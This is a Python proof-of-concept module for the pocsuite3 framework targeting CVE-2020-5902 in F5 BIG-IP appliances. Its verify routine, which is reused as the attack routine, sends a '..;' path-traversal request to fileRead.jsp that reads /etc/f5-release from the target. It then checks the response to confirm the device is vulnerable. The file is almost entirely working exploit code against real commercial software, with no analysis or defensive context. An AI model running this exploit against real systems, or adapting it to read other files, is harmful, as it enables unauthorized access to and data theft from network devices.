#!/usr/bin/env python
# -*- coding:utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = '''CVE-2020-5902'''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''F5_BIG-IP_RCE'''
    desc = ''''''
    severity = '''high'''
    vulType = '''code-exec'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''F5 BIG-IP'''
    appVersion = '''15.x：15.1.0,15.x：15.0.0,14.X：14.1.0 - 14.1.2,13.X ：13.1.0 - 13.1.3,12.X：12.1.0 - 12.1.5,11.X：11.6.1 - 11.6.5'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        verify_url = make_verify_url(self.url, '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release', mod=0)
        resp = requests.post(verify_url, allow_redirects=False, verify=False, timeout=15)
        if b'{"output":"' in resp.content and b"BIG-IP release" in resp.content and resp.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(TestPOC)
